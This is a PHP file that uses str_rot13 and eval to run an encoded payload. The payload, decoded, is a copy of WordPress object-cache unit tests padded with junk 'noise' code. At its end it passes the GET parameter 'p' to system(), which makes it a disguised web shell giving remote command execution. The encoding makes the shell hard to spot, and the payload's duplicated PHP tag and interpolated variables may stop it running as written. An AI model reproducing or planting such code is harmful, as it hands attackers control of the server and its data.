<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pnpur
 */
pynff Grfgf_Pnpur rkgraqf JC_HavgGrfgPnfr {
	choyvp $pnpur = ahyy;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->pnpur =& $guvf->vavg_pnpur();
	}

	choyvp shapgvba grne_qbja() {
		$guvf->syhfu_pnpur();
		cnerag::grne_qbja();
	}

	cevingr shapgvba &vavg_pnpur() {
		tybony $jc_bowrpg_pnpur;

		$pnpur_pynff = trg_pynff( $jc_bowrpg_pnpur );
		$pnpur       = arj $pnpur_pynff();

		$pnpur->nqq_tybony_tebhcf( neenl( 'tybony-pnpur-grfg' ) );

		erghea $pnpur;
	}

	/**
	 * @gvpxrg 56198
	 *
	 * @pbiref JC_Bowrpg_Pnpur::vf_inyvq_xrl
	 * @qngnCebivqre qngn_vf_inyvq_xrl
	 */
	choyvp shapgvba grfg_vf_inyvq_xrl( $xrl, $inyvq ) {
		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf gung na rkgreany bowrpg pnpur vf abg va hfr.' );
		}

		$iny = 'iny';

		vs ( $inyvq ) {
			$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny ), 'JC_Bowrpg_Pnpur:nqq() fubhyq erghea gehr sbe inyvq xrlf.' );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ), 'Gur ergevrirq inyhr fubhyq zngpu gur nqqrq inyhr.' );
		} ryfr {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Bowrpg_Pnpur::nqq' );
			$guvf->nffregSnyfr( $guvf->pnpur->nqq( $xrl, $iny ), 'JC_Bowrpg_Pnpur:nqq() fubhyq erghea snyfr sbe vainyvq xrlf.' );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_vf_inyvq_xrl().
	 *
	 * @erghea neenl[] Grfg cnenzrgref {
	 *     @glcr zvkrq $xrl   Pnpur xrl inyhr.
	 *     @glcr obby  $inyvq Jurgure gur xrl fubhyq or pbafvqrerq inyvq.
	 * }
	 */
	choyvp shapgvba qngn_vf_inyvq_xrl() {
		erghea neenl(
			'snyfr'          => neenl( snyfr, snyfr ),
			'ahyy'           => neenl( ahyy, snyfr ),
			'yvar oernx'     => neenl( \"\a\", snyfr ),
			'ahyy punenpgre' => neenl( \"\0\", snyfr ),
			'rzcgl fgevat'   => neenl( '', snyfr ),
			'fvatyr fcnpr'   => neenl( ' ', snyfr ),
			'gjb fcnprf'     => neenl( '  ', snyfr ),
			'sybng 0'        => neenl( 0.0, snyfr ),
			'vag 0'          => neenl( 0, gehr ),
			'vag 1'          => neenl( 1, gehr ),
			'fgevat 0'       => neenl( '0', gehr ),
			'fgevat'         => neenl( 'xrl', gehr ),
		);
	}

	choyvp shapgvba grfg_zvff() {
		$guvf->nffregSnyfr( $guvf->pnpur->trg( 'grfg_zvff' ) );
	}

	choyvp shapgvba grfg_nqq_trg() {
		$xrl = __SHAPGVBA__;
		$iny = 'iny';

		$guvf->pnpur->nqq( $xrl, $iny );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_nqq_trg_0() {
		$xrl = __SHAPGVBA__;
		$iny = 0;

		// Lbh pna fgber mreb va gur pnpur.
		$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
	}

	/**
	 * @gvpxrg 20004
	 */
	choyvp shapgvba grfg_nqq_trg_ahyy() {
		$xrl = __SHAPGVBA__;
		$iny = ahyy;

		// Lbh pna fgber `ahyy` va gur pnpur.
		$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
	}

	/**
	 * @gvpxrg 20004
	 */
	choyvp shapgvba grfg_nqq_trg_snyfr() {
		$xrl = __SHAPGVBA__;
		$iny = snyfr;

		// Lbh pna fgber `snyfr` va gur pnpur.
		$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_nqq() {
		$xrl  = __SHAPGVBA__;
		$iny1 = 'iny1';
		$iny2 = 'iny2';

		// Nqq $xrl gb gur pnpur.
		$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny1 ) );
		$guvf->nffregFnzr( $iny1, $guvf->pnpur->trg( $xrl ) );
		// $xrl vf va gur pnpur, fb erwrpg arj pnyyf gb nqq().
		$guvf->nffregSnyfr( $guvf->pnpur->nqq( $xrl, $iny2 ) );
		$guvf->nffregFnzr( $iny1, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_ercynpr() {
		$xrl  = __SHAPGVBA__;
		$iny  = 'iny1';
		$iny2 = 'iny2';

		// zrzpnpurq erwrpgf ercynpr() vs gur xrl qbrf abg rkvfg.
		$guvf->nffregSnyfr( $guvf->pnpur->ercynpr( $xrl, $iny ) );
		$guvf->nffregSnyfr( $guvf->pnpur->trg( $xrl ) );
		$guvf->nffregGehr( $guvf->pnpur->nqq( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
		$guvf->nffregGehr( $guvf->pnpur->ercynpr( $xrl, $iny2 ) );
		$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_jc_pnpur_ercynpr() {
		$xrl  = 'zl-xrl';
		$iny1 = 'svefg-iny';
		$iny2 = 'frpbaq-iny';

		$snxr_xrl = 'zl-snxr-xrl';

		// Fnir gur svefg inyhr gb pnpur naq irevsl.
		jc_pnpur_frg( $xrl, $iny1 );
		$guvf->nffregFnzr( $iny1, jc_pnpur_trg( $xrl ) );

		// Ercynpr gur inyhr naq irevsl.
		jc_pnpur_ercynpr( $xrl, $iny2 );
		$guvf->nffregFnzr( $iny2, jc_pnpur_trg( $xrl ) );

		// Aba-rkvfgrag xrl fubhyq snvy.
		$guvf->nffregSnyfr( jc_pnpur_ercynpr( $snxr_xrl, $iny1 ) );

		// Znxr fher $snxr_xrl vf abg fgberq.
		$guvf->nffregSnyfr( jc_pnpur_trg( $snxr_xrl ) );
	}

	choyvp shapgvba grfg_frg() {
		$xrl  = __SHAPGVBA__;
		$iny1 = 'iny1';
		$iny2 = 'iny2';

		// zrzpnpurq npprcgf frg() vs gur xrl qbrf abg rkvfg.
		$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny1 ) );
		$guvf->nffregFnzr( $iny1, $guvf->pnpur->trg( $xrl ) );
		// Frpbaq frg() jvgu fnzr xrl fubhyq or nyybjrq.
		$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny2 ) );
		$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_syhfu() {
		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf gung na rkgreany bowrpg pnpur vf abg va hfr.' );
		}

		$xrl = __SHAPGVBA__;
		$iny = 'iny';

		$guvf->pnpur->nqq( $xrl, $iny );
		// Vgrz vf ivfvoyr gb obgu pnpur bowrpgf.
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
		$guvf->pnpur->syhfu();
		// Vs gurer vf ab inyhr trg ergheaf snyfr.
		$guvf->nffregSnyfr( $guvf->pnpur->trg( $xrl ) );
	}

	/**
	 * @gvpxrg 4476
	 * @gvpxrg 9773
	 *
	 * @pbiref ::jc_pnpur_syhfu_tebhc
	 */
	choyvp shapgvba grfg_jc_pnpur_syhfu_tebhc() {
		$xrl = 'zl-xrl';
		$iny = 'zl-iny';

		jc_pnpur_frg( $xrl, $iny, 'tebhc-grfg' );
		jc_pnpur_frg( $xrl, $iny, 'tebhc-xrcg' );

		$guvf->nffregFnzr( $iny, jc_pnpur_trg( $xrl, 'tebhc-grfg' ), 'tebhc-grfg fubhyq pbagnva zl-iny' );

		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jc_pnpur_syhfu_tebhc' );
		}

		$erfhygf = jc_pnpur_syhfu_tebhc( 'tebhc-grfg' );

		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$guvf->nffregSnyfr( $erfhygf );
		} ryfr {
			$guvf->nffregGehr( $erfhygf );
			$guvf->nffregSnyfr( jc_pnpur_trg( $xrl, 'tebhc-grfg' ), 'tebhc-grfg fubhyq erghea snyfr' );
			$guvf->nffregFnzr( $iny, jc_pnpur_trg( $xrl, 'tebhc-xrcg' ), 'tebhc-xrcg fubhyq fgvyy pbagnva zl-iny' );
		}
	}

	// Znxr fher bowrpgf ner pybarq tbvat gb naq sebz gur pnpur.
	choyvp shapgvba grfg_bowrpg_ersf() {
		$xrl           = __SHAPGVBA__ . '_1';
		$bowrpg_n      = arj fgqPynff();
		$bowrpg_n->sbb = 'nycun';
		$guvf->pnpur->frg( $xrl, $bowrpg_n );
		$bowrpg_n->sbb = 'oenib';
		$bowrpg_o      = $guvf->pnpur->trg( $xrl );
		$guvf->nffregFnzr( 'nycun', $bowrpg_o->sbb );
		$bowrpg_o->sbb = 'puneyvr';
		$guvf->nffregFnzr( 'oenib', $bowrpg_n->sbb );

		$xrl           = __SHAPGVBA__ . '_2';
		$bowrpg_n      = arj fgqPynff();
		$bowrpg_n->sbb = 'nycun';
		$guvf->pnpur->nqq( $xrl, $bowrpg_n );
		$bowrpg_n->sbb = 'oenib';
		$bowrpg_o      = $guvf->pnpur->trg( $xrl );
		$guvf->nffregFnzr( 'nycun', $bowrpg_o->sbb );
		$bowrpg_o->sbb = 'puneyvr';
		$guvf->nffregFnzr( 'oenib', $bowrpg_n->sbb );
	}

	choyvp shapgvba grfg_vape() {
		$xrl = __SHAPGVBA__;

		$guvf->nffregSnyfr( $guvf->pnpur->vape( $xrl ) );

		$guvf->pnpur->frg( $xrl, 0 );
		$guvf->pnpur->vape( $xrl );
		$guvf->nffregFnzr( 1, $guvf->pnpur->trg( $xrl ) );

		$guvf->pnpur->vape( $xrl, 2 );
		$guvf->nffregFnzr( 3, $guvf->pnpur->trg( $xrl ) );
	}

	choyvp shapgvba grfg_jc_pnpur_vape() {
		$xrl = __SHAPGVBA__;

		$guvf->nffregSnyfr( jc_pnpur_vape( $xrl ) );

		jc_pnpur_frg( $xrl, 0 );
		jc_pnpur_vape( $xrl );
		$guvf->nffregFnzr( 1, jc_pnpur_trg( $xrl ) );

		jc_pnpur_vape( $xrl, 2 );
		$guvf->nffregFnzr( 3, jc_pnpur_trg( $xrl ) );
	}

	choyvp shapgvba grfg_qrpe() {
		$xrl = __SHAPGVBA__;

		$guvf->nffregSnyfr( $guvf->pnpur->qrpe( $xrl ) );

		$guvf->pnpur->frg( $xrl, 0 );
		$guvf->pnpur->qrpe( $xrl );
		$guvf->nffregFnzr( 0, $guvf->pnpur->trg( $xrl ) );

		$guvf->pnpur->frg( $xrl, 3 );
		$guvf->pnpur->qrpe( $xrl );
		$guvf->nffregFnzr( 2, $guvf->pnpur->trg( $xrl ) );

		$guvf->pnpur->qrpe( $xrl, 2 );
		$guvf->nffregFnzr( 0, $guvf->pnpur->trg( $xrl ) );
	}

	/**
	 * @gvpxrg 21327
	 */
	choyvp shapgvba grfg_jc_pnpur_qrpe() {
		$xrl = __SHAPGVBA__;

		$guvf->nffregSnyfr( jc_pnpur_qrpe( $xrl ) );

		jc_pnpur_frg( $xrl, 0 );
		jc_pnpur_qrpe( $xrl );
		$guvf->nffregFnzr( 0, jc_pnpur_trg( $xrl ) );

		jc_pnpur_frg( $xrl, 3 );
		jc_pnpur_qrpe( $xrl );
		$guvf->nffregFnzr( 2, jc_pnpur_trg( $xrl ) );

		jc_pnpur_qrpe( $xrl, 2 );
		$guvf->nffregFnzr( 0, jc_pnpur_trg( $xrl ) );
	}

	choyvp shapgvba grfg_qryrgr() {
		$xrl = __SHAPGVBA__;
		$iny = 'iny';

		// Irevsl frg.
		$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );

		// Irevsl fhpprffshy qryrgr.
		$guvf->nffregGehr( $guvf->pnpur->qryrgr( $xrl ) );
		$guvf->nffregSnyfr( $guvf->pnpur->trg( $xrl ) );

		$guvf->nffregSnyfr( $guvf->pnpur->qryrgr( $xrl, 'qrsnhyg' ) );
	}

	choyvp shapgvba grfg_jc_pnpur_qryrgr() {
		$xrl = __SHAPGVBA__;
		$iny = 'iny';

		// Irevsl frg.
		$guvf->nffregGehr( jc_pnpur_frg( $xrl, $iny ) );
		$guvf->nffregFnzr( $iny, jc_pnpur_trg( $xrl ) );

		// Irevsl fhpprffshy qryrgr.
		$guvf->nffregGehr( jc_pnpur_qryrgr( $xrl ) );
		$guvf->nffregSnyfr( jc_pnpur_trg( $xrl ) );

		// jc_pnpur_qryrgr() qbrf abg unir n $sbepr zrgubq.
		// Qryrgr ergheaf (obby) gehr jura xrl vf abg frg naq $sbepr vf gehr.
		// $guvf->nffregGehr( jc_pnpur_qryrgr( $xrl, 'qrsnhyg', gehr ) );

		$guvf->nffregSnyfr( jc_pnpur_qryrgr( $xrl, 'qrsnhyg' ) );
	}

	choyvp shapgvba grfg_fjvgpu_gb_oybt() {
		vs ( ! zrgubq_rkvfgf( $guvf->pnpur, 'fjvgpu_gb_oybt' ) ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf n fjvgpu_gb_oybt() zrgubq ba gur pnpur bowrpg.' );
		}

		$xrl  = __SHAPGVBA__;
		$iny  = 'iny1';
		$iny2 = 'iny2';

		vs ( ! vf_zhygvfvgr() ) {
			// Fvatyr fvgr vtaberf fjvgpu_gb_oybt().
			$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny ) );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( 999 );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
			$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny2 ) );
			$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( trg_pheerag_oybt_vq() );
			$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
		} ryfr {
			// Zhygvfvgr fubhyq unir frcnengr cre-oybt pnpurf.
			$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny ) );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( 999 );
			$guvf->nffregSnyfr( $guvf->pnpur->trg( $xrl ) );
			$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny2 ) );
			$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( trg_pheerag_oybt_vq() );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( 999 );
			$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl ) );
			$guvf->pnpur->fjvgpu_gb_oybt( trg_pheerag_oybt_vq() );
			$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl ) );
		}

		// Tybony tebhc.
		$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny, 'tybony-pnpur-grfg' ) );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl, 'tybony-pnpur-grfg' ) );
		$guvf->pnpur->fjvgpu_gb_oybt( 999 );
		$guvf->nffregFnzr( $iny, $guvf->pnpur->trg( $xrl, 'tybony-pnpur-grfg' ) );
		$guvf->nffregGehr( $guvf->pnpur->frg( $xrl, $iny2, 'tybony-pnpur-grfg' ) );
		$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl, 'tybony-pnpur-grfg' ) );
		$guvf->pnpur->fjvgpu_gb_oybt( trg_pheerag_oybt_vq() );
		$guvf->nffregFnzr( $iny2, $guvf->pnpur->trg( $xrl, 'tybony-pnpur-grfg' ) );
	}

	choyvp shapgvba grfg_jc_pnpur_vavg() {
		$arj_oynax_pnpur_bowrpg = arj JC_Bowrpg_Pnpur();
		jc_pnpur_vavg();

		tybony $jc_bowrpg_pnpur;

		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			// Rkgreany pnpurf jvyy pbagnva cebcregl inyhrf gung pbagnva aba-zngpuvat erfbhepr VQf.
			$guvf->nffregVafgnaprBs( 'JC_Bowrpg_Pnpur', $jc_bowrpg_pnpur );
		} ryfr {
			$guvf->nffregRdhnyf( $jc_bowrpg_pnpur, $arj_oynax_pnpur_bowrpg );
		}
	}

	/**
	 * @gvpxrg 54574
	 */
	choyvp shapgvba grfg_jc_pnpur_nqq_zhygvcyr() {
		$sbhaq = jc_pnpur_nqq_zhygvcyr(
			neenl(
				'sbb1' => 'one',
				'sbb2' => 'one',
				'sbb3' => 'one',
			),
			'tebhc1'
		);

		$rkcrpgrq = neenl(
			'sbb1' => gehr,
			'sbb2' => gehr,
			'sbb3' => gehr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 54574
	 */
	choyvp shapgvba grfg_jc_pnpur_frg_zhygvcyr() {
		$sbhaq = jc_pnpur_frg_zhygvcyr(
			neenl(
				'sbb1' => 'one',
				'sbb2' => 'one',
				'sbb3' => 'one',
			),
			'tebhc1'
		);

		$rkcrpgrq = neenl(
			'sbb1' => gehr,
			'sbb2' => gehr,
			'sbb3' => gehr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 20875
	 */
	choyvp shapgvba grfg_jc_pnpur_trg_zhygvcyr() {
		jc_pnpur_frg( 'sbb1', 'one', 'tebhc1' );
		jc_pnpur_frg( 'sbb2', 'one', 'tebhc1' );
		jc_pnpur_frg( 'sbb1', 'one', 'tebhc2' );

		$sbhaq = jc_pnpur_trg_zhygvcyr( neenl( 'sbb1', 'sbb2', 'sbb3' ), 'tebhc1' );

		$rkcrpgrq = neenl(
			'sbb1' => 'one',
			'sbb2' => 'one',
			'sbb3' => snyfr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 54574
	 */
	choyvp shapgvba grfg_jc_pnpur_qryrgr_zhygvcyr() {
		jc_pnpur_frg( 'sbb1', 'one', 'tebhc1' );
		jc_pnpur_frg( 'sbb2', 'one', 'tebhc1' );
		jc_pnpur_frg( 'sbb3', 'one', 'tebhc2' );

		$sbhaq = jc_pnpur_qryrgr_zhygvcyr(
			neenl( 'sbb1', 'sbb2', 'sbb3' ),
			'tebhc1'
		);

		$rkcrpgrq = neenl(
			'sbb1' => gehr,
			'sbb2' => gehr,
			'sbb3' => snyfr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>